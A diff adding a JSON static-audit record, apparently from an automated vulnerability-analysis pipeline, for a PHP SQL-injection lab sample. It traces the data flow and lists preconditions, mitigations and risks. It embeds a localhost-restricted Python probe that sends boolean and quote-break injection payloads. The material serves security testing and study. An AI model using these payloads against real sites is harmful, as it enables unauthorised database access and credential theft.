@@ -1,0 +1,140 @@
+{
+  "schema_version": "wp2-output-v1",
+  "sample_id": "SQLI-001",
+  "input_version": "v2",
+  "prompt_version": "v1",
+  "analysis_stage": "parent",
+  "received_packet_ids": [
+    "SQLI-001"
+  ],
+  "prediction": "存在候选",
+  "verdict": "待验证",
+  "confidence": {
+    "level": "high",
+    "reason": "输入读取（第137行）、SQL 拼接（第143行）、执行（第144行）与结果/错误回显（第149-157行）都在同一片段内可见；该路径上没有 intval、白名单、转义或参数化处理。连接文件内容与运行时配置虽未提供，但不影响“请求参数直接拼进单引号字符串后交给 mysql_query”这一关键静态事实。"
+  },
+  "findings": [
+    {
+      "finding_id": "SQLI-001-F1",
+      "vulnerability_type": "SQL注入（字符串上下文，布尔/报错/UNION 型）",
+      "locations": [
+        {
+          "fragment_id": "SQLI-001",
+          "line_start": 137,
+          "line_end": 137,
+          "quote": "$id=$_GET['id'];"
+        },
+        {
+          "fragment_id": "SQLI-001",
+          "line_start": 143,
+          "line_end": 143,
+          "quote": "$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";"
+        },
+        {
+          "fragment_id": "SQLI-001",
+          "line_start": 144,
+          "line_end": 144,
+          "quote": "$result=mysql_query($sql);"
+        },
+        {
+          "fragment_id": "SQLI-001",
+          "line_start": 149,
+          "line_end": 149,
+          "quote": "echo 'Your Login name:'. $row['username'];"
+        },
+        {
+          "fragment_id": "SQLI-001",
+          "line_start": 151,
+          "line_end": 151,
+          "quote": "echo 'Your Password:' .$row['password'];"
+        },
+        {
+          "fragment_id": "SQLI-001",
+          "line_start": 157,
+          "line_end": 157,
+          "quote": "print_r(mysql_error());"
+        }
+      ],
+      "data_flow": [
+        "第135-137行：if(isset($_GET['id'])) 成立后直接执行 $id=$_GET['id']，未做类型转换、数字白名单或转义。",
+        "第139-141行：原始 $id 被追加写入 result.txt，仅作为日志，不改变变量内容。",
+        "第143行：在单引号字符串上下文中把 $id 拼入 SELECT * FROM users WHERE id='$id' LIMIT 0,1。",
+        "第144行：拼接后的整条 SQL 交给 mysql_query 执行，没有 mysqli/PDO 预处理或占位符绑定。",
+        "第145-152行：mysql_fetch_array 取首行并回显 username、password，是数据被带出的观察点。",
+        "第157行：查询失败分支把 mysql_error() 原文打印到页面，是报错型观察点。",
+        "第132行：include 的连接文件只负责建立连接；其内容未提供，假定不参与本参数的过滤。"
+      ],
+      "principle": "用户可控的 id 参数未经任何转义就被插入到单引号包裹的 SQL 字面量中，攻击者可用单引号闭合字符串并追加 SQL 片段（如 OR 条件、UNION SELECT、注释符），使数据库执行攻击者构造的查询，而不是仅按 id 等值匹配。",
+      "impact": "可绕过 WHERE 条件读取 users 表首行以外的数据；布尔/报错/UNION 注入可用于枚举并读取 security 库中 users 表的用户名与口令字段，具体范围取决于连接账户权限。页面未体现鉴权，能访问该 URL 者均可尝试。",
+      "preconditions": [
+        "目标页面可访问，且代码按第135-137行从 GET 参数 id 取值。",
+        "运行环境提供 mysql_* 扩展（PHP 7 以下或兼容层），且第132行的连接文件能成功连接 security 库。",
+        "在进入第143行前没有对 $_GET['id'] 做 addslashes、mysqli_real_escape_string、intval 或白名单校验（magic_quotes_gpc=Off、无前置 WAF 改写）。",
+        "数据库账户对 security.users 具有 SELECT 权限。"
+      ],
+      "counterexamples": [
+        "若 php.ini 中 magic_quotes_gpc=On（旧版 PHP）或全局对 $_GET 做了 addslashes，单引号会被转义，本文的字符串闭合路径不成立。",
+        "若 $id 被 intval 强制转换为整数，或 preg_match('/^[0-9]+$/') 之类的数字白名单拦截，则无法闭合字符串。",
+        "若后续改造为 PDO/mysqli 预处理并绑定参数，第143-144行的拼接执行路径消失。",
+        "若 include 的连接文件在取得 $id 后重写该变量或直接退出，需按实际文件内容重新评估。"
+      ],
+      "poc": {
+        "status": "需人工适配",
+        "language": "python",
+        "code": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"SQLI-001 本地授权靶场最小验证草案。\n\n只对 localhost/127.0.0.1/::1 发起请求，不跟随重定向，不导出数据库内容。\n用法示例：\n  python sqli-001-poc.py --base-url http://127.0.0.1:8080/Less-1/ --param id\n\"\"\"\n\nimport argparse\nimport sys\nimport urllib.error\nimport urllib.parse\nimport urllib.request\n\nALLOWED_HOSTS = {\"localhost\", \"127.0.0.1\", \"::1\"}\n\n\nclass NoRedirect(urllib.request.HTTPRedirectHandler):\n    def redirect_request(self, req, fp, code, msg, headers, newurl):\n        return None\n\n\ndef validate_base_url(raw):\n    parts = urllib.parse.urlsplit(raw)\n    if parts.scheme not in (\"http\", \"https\"):\n        raise ValueError(\"仅允许 http/https，实际为: %r\" % (parts.scheme,))\n    host = (parts.hostname or \"\").lower()\n    if host not in ALLOWED_HOSTS:\n        raise ValueError(\"仅允许本地授权地址 %s，实际主机: %r\" % (sorted(ALLOWED_HOSTS), host))\n    if not parts.path:\n        raise ValueError(\"URL 缺少路径\")\n    return raw\n\n\ndef request_once(opener, base_url, param, payload, timeout):\n    query = urllib.parse.urlencode({param: payload})\n    url = base_url + (\"&\" if \"?\" in base_url else \"?\") + query\n    req = urllib.request.Request(url, headers={\"User-Agent\": \"sqli-001-lab-poc/1.0\"})\n    try:\n        with opener.open(req, timeout=timeout) as resp:\n            body = resp.read(262144).decode(\"utf-8\", \"replace\")\n            return {\"kind\": \"response\", \"status\": resp.status, \"url\": url, \"body\": body, \"error\": None}\n    except urllib.error.HTTPError as exc:\n        body = exc.read(262144).decode(\"utf-8\", \"replace\") if exc.fp else \"\"\n        kind = \"redirect\" if 300 <= exc.code < 400 else \"http_error\"\n        return {\"kind\": kind, \"status\": exc.code, \"url\": url, \"body\": body, \"error\": str(exc)}\n    except urllib.error.URLError as exc:\n        return {\"kind\": \"connection_error\", \"status\": None, \"url\": url, \"body\": \"\", \"error\": str(exc.reason)}\n    except TimeoutError as exc:\n        return {\"kind\": \"timeout\", \"status\": None, \"url\": url, \"body\": \"\", \"error\": str(exc)}\n\n\ndef has_user_row(body):\n    return (\"Your Login name:\" in body) or (\"Your Password:\" in body)\n\n\ndef summarize(label, payload, result):\n    body = result[\"body\"]\n    print(\"[%s] payload=%r\" % (label, payload))\n    print(\"    kind=%s status=%s\" % (result[\"kind\"], result[\"status\"]))\n    if result[\"error\"]:\n        print(\"    error=%s\" % result[\"error\"])\n    print(\"    user_row_signature=%s\" % has_user_row(body))\n    markers = (\"SQL syntax\", \"mysql_fetch_array\", \"Warning:\", \"You have an error\")\n    print(\"    sql_error_marker=%s\" % any(m in body for m in markers))\n    print(\"    body_length=%d\" % len(body))\n\n\ndef main(argv=None):\n    parser = argparse.ArgumentParser(description=\"SQLI-001 本地最小 SQL 注入验证草案\")\n    parser.add_argument(\"--base-url\", required=True, help=\"本地靶场页面完整 URL，仅限 localhost/127.0.0.1/::1\")\n    parser.add_argument(\"--param\", default=\"id\", help=\"注入参数名，默认 id\")\n    parser.add_argument(\"--timeout\", type=float, default=5.0, help=\"单次请求超时秒数，默认 5\")\n    args = parser.parse_args(argv)\n\n    try:\n        base_url = validate_base_url(args.base_url)\n    except ValueError as exc:\n        print(\"参数错误: %s\" % exc, file=sys.stderr)\n        return 2\n\n    opener = urllib.request.build_opener(NoRedirect)\n    probes = [\n        (\"baseline\", \"1\"),\n        (\"quote_only\", \"1'\"),\n        (\"true_condition\", \"1' AND '1'='1\"),\n        (\"false_condition\", \"1' AND '1'='2\"),\n    ]\n\n    results = {}\n    for label, payload in probes:\n        result = request_once(opener, base_url, args.param, payload, args.timeout)\n        results[label] = result\n        summarize(label, payload, result)\n\n    base_sig = has_user_row(results[\"baseline\"][\"body\"])\n    true_sig = has_user_row(results[\"true_condition\"][\"body\"])\n    false_sig = has_user_row(results[\"false_condition\"][\"body\"])\n\n    print(\"\")\n    print(\"对照结论（仅供人工复核，不是自动化漏洞定性）:\")\n    print(\"  baseline 用户行: %s\" % base_sig)\n    print(\"  true 条件用户行: %s\" % true_sig)\n    print(\"  false 条件用户行: %s\" % false_sig)\n    if not base_sig:\n        print(\"  [环境] 基线未出现用户行：检查 URL/参数/部署状态，不能据此判断漏洞。\")\n    if true_sig and not false_sig:\n        print(\"  [观察] true 与 false 条件响应不同：存在布尔注入线索，需人工复核。\")\n    else:\n        print(\"  [观察] 未观察到 true/false 差异：当前条件无证据，需排查过滤或环境。\")\n    return 0\n\n\nif __name__ == \"__main__\":\n    sys.exit(main())\n",
+        "artifact_path": null,
+        "dependencies": [
+          "Python 3.8 及以上",
+          "仅标准库：argparse、sys、urllib.request、urllib.parse、urllib.error"
+        ],
+        "parameters": [
+          "--base-url 本地部署页面完整 URL（默认只允许 localhost/127.0.0.1/::1，需人工替换为实际路径）",
+          "--param 注入参数名，默认 id",
+          "--timeout 单次请求超时秒数，默认 5"
+        ],
+        "steps": [
+          "在本地授权靶场确认 SQLI-001 对应页面的实际可访问 URL（片段不能独立部署，需与 sql-connections/sql-connect.php 及 security 库一起运行）。",
+          "记录源提交、PHP 与 MySQL 版本、magic_quotes_gpc/sql_mode、部署路径与参数名。",
+          "执行：python sqli-001-poc.py --base-url http://127.0.0.1:8080/<实际路径> --param id --timeout 5。",
+          "对比 baseline、quote_only、true_condition、false_condition 四组响应，只观察是否出现用户行签名与 SQL 错误标记。",
+          "测试后检查目标目录下 result.txt 的追加记录，确认测试痕迹并说明恢复/清理方式（脚本本身不写业务数据）。"
+        ],
+        "expected_observation": "baseline（id=1）返回包含 'Your Login name:' 的用户行；quote_only（id=1'）相对基线出现 SQL 语法错误文本或用户行消失；true_condition（id=1' AND '1'='1）重新出现用户行，而 false_condition（id=1' AND '1'='2）不出现用户行。",
+        "success_criteria": "在同一部署、同一参数、仅改变 id 值的对照下：true 条件载荷稳定出现 'Your Login name:' 输出，false 条件载荷不出现，且 baseline 可复现；同时 quote_only 与 baseline 的响应存在稳定差异。仅 HTTP 200、仅输入被回显或仅出现函数名均不构成成功证据。",
+        "limitations": [
+          "片段不能独立部署，必须人工确认实际 URL、参数名与依赖文件。",
+          "脚本只做布尔与报错观测，不执行 UNION 或数据导出，因此不能证明可读取的数据范围。",
+          "本次未在真实环境运行，execution_status 为未运行，行为仅为草案预期。",
+          "若目标存在 magic_quotes、WAF 或输出过滤，需记录该条件并重新测试。"
+        ],
+        "execution_status": "未运行"
+      }
+    }
+  ],
+  "exclusion_evidence": [],
+  "missing_context": [
+    "context/sqli-connect.php（sql-connections/sql-connect.php 与 db-creds.inc）的实际内容，需确认其中没有对 id 的额外过滤或改写。",
+    "实际部署的 PHP、MySQL 版本及 php.ini 配置（magic_quotes_gpc、error_reporting、display_errors）。",
+    "security 库与 users 表的结构、数据状态，以及连接账户的权限范围。",
+    "页面部署基址、Web 服务器重写规则与是否存在前置 WAF/代理。",
+    "是否有其他入口或包含链会对 id 做预处理。"
+  ],
+  "risk_notes": [
+    "第139-141行把原始 id 明文追加写入 result.txt，未校验路径与并发，存在日志注入与磁盘写入风险，属于本关注类型之外的问题。",
+    "第157行把数据库错误原文输出到页面，泄露库表/语法信息，即使修复注入也应关闭。",
+    "第149-151行直接回显用户口令字段，属于敏感信息暴露。",
+    "片段未见任何登录或权限校验，页面可被未认证访问。"
+  ],
+  "quality_notes": [
+    "mysql_* 函数自 PHP 5.5 起废弃、PHP 7 起移除，需兼容层或旧版本运行时。",
+    "error_reporting(0) 掩盖错误，且 fwrite/fclose 未检查返回值。",
+    "SQL 使用 SELECT * 并 LIMIT 0,1，依赖隐式排序，结果不稳定。"
+  ],
+  "limitations": [
+    "仅做静态审计，未运行目标，未获得任何运行证据，因此 verdict 只能为待验证。",
+    "审计范围仅为给定的 normalized_samples/SQLI-001.php 片段，不覆盖连接文件与同项目其他入口。",
+    "POC 草案按本地授权与只读观测约束编写，未验证其在实际目标上的可执行性。",
+    "结论不表示整个项目安全或不存在其他注入点。"
+  ],
+  "runtime_evidence": []
+}
